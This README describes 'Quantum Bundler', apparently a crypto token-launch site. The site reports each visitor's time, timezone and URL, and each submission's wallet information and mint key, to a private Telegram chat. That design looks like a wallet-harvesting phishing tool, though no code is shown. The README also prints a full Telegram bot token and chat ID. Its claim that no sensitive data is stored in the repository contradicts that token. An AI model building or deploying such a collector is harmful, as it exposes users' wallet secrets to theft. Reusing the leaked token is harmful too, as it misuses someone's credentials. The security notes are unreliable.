# Quantum Bundler

A tool for launching tokens with Telegram integration.

## Current Features
- Token creation form
- Wallet management (up to 8 wallets)
- Mint key generation
- Telegram notifications for:
  - ✅ Site visits (with timezone and URL)
  - ✅ Token launch submissions
- Secure environment variables

## Development Status
- ✅ Basic functionality working
- ✅ Telegram integration complete
- ✅ Environment variables set up
- ✅ Deployed on Vercel
- ✅ All notifications working
- ✅ Bundle submissions working

## Development Notes
- Local testing: Use direct token in index.html
- Token is now hardcoded for reliability
- Always test locally before pushing
- Wait 1-2 minutes after pushing for Vercel to deploy

## Important Information
- GitHub Repository: https://github.com/frankmcallister13/quantum-bundler
- Deployment: Vercel
- Telegram Bot Token: 7648929218:AAFjh4v_bfESlHcbokO8eca8RZQvwr-RXVc
- Chat ID: 5651527672

## Working Features
1. Site Visit Notifications:
   - Shows visit time
   - Shows timezone
   - Shows URL
2. Bundle Submissions:
   - Sends wallet information
   - Sends mint key
   - Shows success message

## Security Notes
- HTTPS enabled by default
- No sensitive data stored in code repository
- Direct token usage for maximum reliability

## Workflow
1. Make changes locally
2. Test thoroughly
3. Push to GitHub when ready
4. Vercel auto-deploys
5. Wait 1-2 minutes for deployment

## To-Do List
- [ ] Add more form validations
- [ ] Improve error handling
- [ ] Add loading states
- [ ] Add success/error notifications 